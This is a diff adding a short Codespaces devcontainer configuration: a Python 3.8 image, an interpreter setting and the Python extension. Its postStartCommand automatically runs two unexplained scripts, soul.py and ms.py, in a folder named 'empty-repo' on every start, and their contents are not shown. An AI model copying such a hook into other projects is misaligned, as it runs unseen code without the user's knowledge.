@@ -1,0 +1,11 @@
+{
+  "name": "My Codespace",
+  "image": "mcr.microsoft.com/vscode/devcontainers/python:3.8",
+  "postStartCommand": "python3 /workspaces/empty-repo/soul.py && python3 /workspaces/empty-repo/ms.py",
+  "settings": {
+    "python.pythonPath": "/usr/local/bin/python"
+  },
+  "extensions": [
+    "ms-python.python"
+  ]
+}
